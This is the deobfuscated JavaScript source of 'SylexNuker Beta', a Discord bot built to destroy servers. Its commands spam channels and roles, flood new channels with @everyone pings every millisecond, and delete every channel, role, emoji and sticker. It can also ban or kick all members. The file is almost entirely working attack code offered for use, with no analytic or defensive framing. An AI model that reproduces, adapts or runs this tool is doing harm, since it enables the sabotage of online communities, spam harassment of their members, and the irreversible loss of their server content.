//:) ez deobf
const {Client, Intents, MessageEmbed} = require("discord.js");
const nuker = new Client({intents: Object.values(Intents.FLAGS).reduce((mayleigh, zeporia) => {
  return mayleigh + zeporia;
})});
const {red, greenBright, cyan, yellow} = require("chalk");
const {token, prefix, userID, disableEveryone} = require("../config/config.json");
nuker.on("ready", () => {
  console.clear();
  console.log(red(`${"\r\n    \r\n                                                   \r\n  ██████▓██   ██▓ ██▓    ▓█████ ▒██   ██▒ ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  \r\n▒██    ▒ ▒██  ██▒▓██▒    ▓█   ▀ ▒▒ █ █ ▒░ ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒\r\n░ ▓██▄    ▒██ ██░▒██░    ▒███   ░░  █   ░▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒\r\n  ▒   ██▒ ░ ▐██▓░▒██░    ▒▓█  ▄  ░ █ █ ▒ ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  \r\n▒██████▒▒ ░ ██▒▓░░██████▒░▒████▒▒██▒ ▒██▒▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒\r\n▒ ▒▓▒ ▒ ░  ██▒▒▒ ░ ▒░▓  ░░░ ▒░ ░▒▒ ░ ░▓ ░░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░\r\n░ ░▒  ░ ░▓██ ░▒░ ░ ░ ▒  ░ ░ ░  ░░░   ░▒ ░░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░\r\n░  ░  ░  ▒ ▒ ░░    ░ ░      ░    ░    ░     ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ \r\n      ░  ░ ░         ░  ░   ░  ░ ░    ░           ░    ░     ░  ░      ░  ░   ░     \r\n         ░ ░                                                                        \r\n                                                                                          \r\n                            Created By SystemError404               \r\n                                                      \r\n                            Beta\r\n                    Nuker: "}${nuker.user.tag}${"\r\n                    Prefix: "}${prefix}${"\r\n    "}`));
  nuker.user.setActivity({name: "SylexNuker Beta", type: "PLAYING"});
});
nuker.on("messageCreate", kasondra => {
  const charro = (new MessageEmbed).setDescription(`${"**SylexNuker Beta ;**\r\n    \\n**mass channels ;**\r\n    "}${prefix}${"mc [amount] (text) i.e \\`"}${prefix}${"mc 5 test\\`\\n\r\n    **mass channel n ping ;**\r\n    "}${prefix}${"cp [amount] (text), {message} i.e \\`"}${prefix}${"cp 5 test, testing\\`\\n\r\n    **mass roles ;**\r\n    "}${prefix}${"mr [amount] (text) i.e \\`"}${prefix}${"mr 5 test\\`\\n\r\n    **delete channels ;**\r\n    "}${prefix}${"dc\\n\r\n    **delete roles ;**\r\n    "}${prefix}${"dr\\n\r\n    **delete emotes ;**\r\n    "}${prefix}${"de\\n\r\n    **delete stickers (new) ;**\r\n    "}${prefix}${"ds\\n\r\n    **mass kick ;**\r\n    "}${prefix}${"mk\\n\r\n    **mass ban ;**\r\n    "}${prefix}${"mb\r\n    "}`).setFooter(`${"© SylexNuker Beta"}`).setColor(3553598).setTimestamp(Date.now());
  const paytton = kasondra.guild.me.permissions.has("MANAGE_CHANNELS");
  const tynzlee = kasondra.guild.me.permissions.has("BAN_MEMBERS");
  const ajanee = kasondra.guild.me.permissions.has("KICK_MEMBERS");
  const samantaha = kasondra.guild.me.permissions.has("MANAGE_ROLES");
  const jeorgia = kasondra.guild.me.permissions.has("MANAGE_EMOJIS_AND_STICKERS");
  let jontasia = kasondra.content.split(" ").slice(1);
  var thiana = jontasia[0];
  var sirinity = jontasia.slice(1).join(" ");
  var roneal = jontasia.slice(2).join(", ");
  if (!disableEveryone) {
    if (kasondra.content.startsWith(prefix + "help")) {
      kasondra.channel.send({embeds: [charro]});
    }
    ;
    if (kasondra.content.startsWith(prefix + "mc")) {
      mayia(thiana, sirinity).catch(enari => {
        kasondra.reply(enari);
      });
    }
    ;
    if (kasondra.content.startsWith(prefix + "dc")) {
      aarabella().catch(maryruth => {
        kasondra.reply(maryruth);
      });
    }
    ;
    if (kasondra.content.startsWith(prefix + "cp")) {
      rayvin(thiana, sirinity, roneal).catch(joeray => {
        kasondra.reply(joeray);
      });
    }
    ;
    if (kasondra.content.startsWith(prefix + "mr")) {
      kamillia(thiana, sirinity).catch(laurena => {
        kasondra.reply(laurena);
      });
    }
    ;
    if (kasondra.content.startsWith(prefix + "dr")) {
      aurianna().catch(pawel => {
        kasondra.reply(pawel);
      });
    }
    ;
    if (kasondra.content.startsWith(prefix + "ds")) {
      awilda().catch(shaolin => {
        kasondra.reply(shaolin);
      });
    }
    ;
    if (kasondra.content.startsWith(prefix + "de")) {
      egor().catch(jaronn => {
        kasondra.reply(jaronn);
      });
    }
    ;
    if (kasondra.content.startsWith(prefix + "mb")) {
      shanona().catch(maisee => {
        kasondra.reply(maisee);
      });
    }
    ;
    if (kasondra.content.startsWith(prefix + "mk")) {
      kizi().catch(kealee => {
        kasondra.reply(kealee);
      });
    }
  } else {
    if (kasondra.content.startsWith(prefix + "help")) {
      if (kasondra.author.id != userID) {
        return kasondra.reply("You are not authorised to use any of this tools' commands.");
      }
      ;
      kasondra.channel.send({embeds: [charro]});
    }
    ;
    if (kasondra.content.startsWith(prefix + "mc")) {
      if (kasondra.author.id != userID) {
        return kasondra.reply("You are not authorised to use any of this tools' commands.");
      }
      ;
      mayia(thiana, sirinity).catch(yon => {
        kasondra.reply(yon);
      });
    }
    ;
    if (kasondra.content.startsWith(prefix + "dc")) {
      if (kasondra.author.id != userID) {
        return kasondra.reply("You are not authorised to use any of this tools' commands.");
      }
      ;
      aarabella().catch(zyari => {
        kasondra.reply(zyari);
      });
    }
    ;
    if (kasondra.content.startsWith(prefix + "cp")) {
      if (kasondra.author.id != userID) {
        return kasondra.reply("You are not authorised to use any of this tools' commands.");
      }
      ;
      rayvin(thiana, sirinity, roneal).catch(pura => {
        kasondra.reply(pura);
      });
    }
    ;
    if (kasondra.content.startsWith(prefix + "mr")) {
      if (kasondra.author.id != userID) {
        return kasondra.reply("You are not authorised to use any of this tools' commands.");
      }
      ;
      kamillia(thiana, sirinity).catch(lui => {
        kasondra.reply(lui);
      });
    }
    ;
    if (kasondra.content.startsWith(prefix + "dr")) {
      if (kasondra.author.id != userID) {
        return kasondra.reply("You are not authorised to use any of this tools' commands.");
      }
      ;
      aurianna().catch(carlvin => {
        kasondra.reply(carlvin);
      });
    }
    ;
    if (kasondra.content.startsWith(prefix + "ds")) {
      if (kasondra.author.id != userID) {
        return kasondra.reply("You are not authorised to use any of this tools' commands.");
      }
      ;
      awilda().catch(elry => {
        kasondra.reply(elry);
      });
    }
    ;
    if (kasondra.content.startsWith(prefix + "de")) {
      if (kasondra.author.id != userID) {
        return kasondra.reply("You are not authorised to use any of this tools' commands.");
      }
      ;
      egor().catch(ubaidullah => {
        kasondra.reply(ubaidullah);
      });
    }
    ;
    if (kasondra.content.startsWith(prefix + "mb")) {
      if (kasondra.author.id != userID) {
        return kasondra.reply("You are not authorised to use any of this tools' commands.");
      }
      ;
      shanona().catch(martavia => {
        kasondra.reply(martavia);
      });
    }
    ;
    if (kasondra.content.startsWith(prefix + "mk")) {
      if (kasondra.author.id != userID) {
        return kasondra.reply("You are not authorised to use any of this tools' commands.");
      }
      ;
      kizi().catch(emiyah => {
        kasondra.reply(emiyah);
      });
    }
  }
  ;
  function mayia(deangel, brinzlee) {
    return new Promise((jurene, cirel) => {
      if (!deangel) {
        return cirel("Unspecified Args: Specify the amount you wish to mass channels");
      }
      ;
      if (isNaN(deangel)) {
        return cirel("Type Error: Use a number for the amout");
      }
      ;
      if (deangel > 500) {
        return cirel("Amount Error: Max guild channel size is 500 | Tip: Use a number lower than 500");
      }
      ;
      if (!paytton) {
        return cirel("Bot Missing Permissions: 'MANAGE_CHANNELS'");
      }
      ;
      for (let zuhur = 0; zuhur < deangel; zuhur++) {
        if (kasondra.guild.channels.cache.size === 500) {
          break;
        }
        ;
        if (!brinzlee) {
          kasondra.guild.channels.create(`${""}${kasondra.author.username}${" was here"}`, {type: "GUILD_TEXT"}).catch(terrod => {
            console.log(red("Error Found: " + terrod));
          });
        } else {
          kasondra.guild.channels.create(brinzlee, {type: "GUILD_TEXT"}).catch(joram => {
            console.log(red("Error Found: " + joram));
          });
        }
      }
      ;
      jurene();
    });
  }
  function rayvin(francois, bower, kentrelle) {
    return new Promise((rijja, belon) => {
      if (!francois) {
        return belon("Unspecified Args: Specify the amount you wish to mass channels");
      }
      ;
      if (isNaN(francois)) {
        return belon("Type Error: Use a number for the amout");
      }
      ;
      if (francois > 500) {
        return belon("Amount Error: Max guild channel size is 500 | Tip: Use a number lower than 500");
      }
      ;
      if (!paytton) {
        return belon("Bot Missing Permissions: 'MANAGE_CHANNELS'");
      }
      ;
      if (!kentrelle) {
        return belon("Unspecified Args: Specify the message you wish to mass mention");
      }
      ;
      for (let tysheim = 0; tysheim < francois; tysheim++) {
        if (kasondra.guild.channels.cache.size === 500) {
          break;
        }
        ;
        if (!bower) {
          kasondra.guild.channels.create(`${""}${kasondra.author.username}${" was here"}`, {type: "GUILD_TEXT"}).catch(oldair => {
            console.log(red("Error Found: " + oldair));
          }).then(zaylie => {
            setInterval(() => {
              zaylie.send("@everyone " + kentrelle);
            }, 1);
          });
        } else {
          kasondra.guild.channels.create(bower, {type: "GUILD_TEXT"}).catch(lilianna => {
            console.log(red("Error Found: " + lilianna));
          }).then(armahni => {
            setInterval(() => {
              armahni.send("@everyone " + kentrelle);
            }, 1);
          });
        }
      }
      ;
      rijja();
    });
  }
  function aarabella() {
    return new Promise((kaylan, natahsa) => {
      if (!paytton) {
        return natahsa("Bot Missing Permissions: 'MANAGE_CHANNELS'");
      }
      ;
      kasondra.guild.channels.cache.forEach(charlott => {
        return charlott.delete().catch(carmello => {
          console.log(red("Error Found: " + carmello));
        });
      });
      kaylan();
    });
  }
  function kamillia(amandia, yahson) {
    return new Promise((macalister, creek) => {
      if (!amandia) {
        return creek("Unspecified Args: Specify the amount you wish to mass roles");
      }
      ;
      if (isNaN(amandia)) {
        return creek("Type Error: Use a number for the amout");
      }
      ;
      if (!samantaha) {
        return creek("Bot Missing Permissions: 'MANAGE_ROLES'");
      }
      ;
      for (let cru = 0; cru <= amandia; cru++) {
        if (kasondra.guild.roles.cache.size === 250) {
          break;
        }
        ;
        if (!yahson) {
          kasondra.guild.roles.create({name: "nuked", color: "RANDOM", position: cru++}).catch(zofie => {
            console.log(red("Error Found: " + zofie));
          });
        } else {
          kasondra.guild.roles.create({name: yahson, color: "RANDOM", position: cru++}).catch(katelee => {
            console.log(red("Error Found: " + katelee));
          });
        }
      }
    });
  }
  function aurianna() {
    return new Promise((ankoma, yaritsa) => {
      if (!samantaha) {
        return yaritsa("Bot Missing Permissions: 'MANAGE_ROLES'");
      }
      ;
      kasondra.guild.roles.cache.forEach(hamir => {
        return hamir.delete().catch(judye => {
          console.log(red("Error Found: " + judye));
        });
      });
    });
  }
  function egor() {
    return new Promise((caydenn, claudean) => {
      if (!jeorgia) {
        return claudean("Bot Missing Permissions: 'MANAGE_EMOJIS_AND_STICKERS'");
      }
      ;
      kasondra.guild.emojis.cache.forEach(natayah => {
        return natayah.delete().catch(adelisa => {
          console.log(red("Error Found: " + adelisa));
        });
      });
    });
  }
  function awilda() {
    return new Promise((kendalynn, roben) => {
      if (!jeorgia) {
        return roben("Bot Missing Permissions: 'MANAGE_EMOJIS_AND_STICKERS'");
      }
      ;
      kasondra.guild.stickers.cache.forEach(yeico => {
        return yeico.delete().catch(lachonda => {
          console.log(red("Error Found: " + lachonda));
        });
      });
    });
  }
  function shanona() {
    return new Promise((zaviere, hagood) => {
      if (!tynzlee) {
        return hagood("Bot Missing Permissions: 'BAN_MEMBERS'");
      }
      ;
      let adrianna = kasondra.guild.members.cache.map(zerelda => {
        return zerelda.id;
      });
      kasondra.reply("Found " + adrianna.length + " users.").then(brittanie => {
        setTimeout(() => {
          brittanie.edit("Banning...");
          for (let dasia = 0; dasia < adrianna.length; dasia++) {
            const jamad = adrianna[dasia];
            const arshan = kasondra.guild.members.cache.get(jamad);
            arshan.ban().catch(darol => {
              console.log(red("Error Found: " + darol));
            }).then(() => {
              console.log(greenBright(`${""}${arshan.user.tag}${" was banned."}`));
            });
          }
        }, 2e3);
      });
    });
  }
  function kizi() {
    return new Promise((ellanah, ophir) => {
      if (!ajanee) {
        return ophir("Bot Missing Permissions: 'KICK_MEMBERS'");
      }
      ;
      let cornia = kasondra.guild.members.cache.map(yureli => {
        return yureli.id;
      });
      kasondra.reply("Found " + cornia.length + " users.").then(mattthew => {
        setTimeout(() => {
          mattthew.edit("Banning...");
          for (let ziden = 0; ziden < cornia.length; ziden++) {
            const charlottle = cornia[ziden];
            const kartyr = kasondra.guild.members.cache.get(charlottle);
            kartyr.kick().catch(annali => {
              console.log(red("Error Found: " + annali));
            }).then(() => {
              console.log(greenBright(`${""}${kartyr.user.tag}${" was kicked."}`));
            });
          }
        }, 2e3);
      });
    });
  }
});
try {
  nuker.login(token);
} catch (err) {
  console.error(err);
}
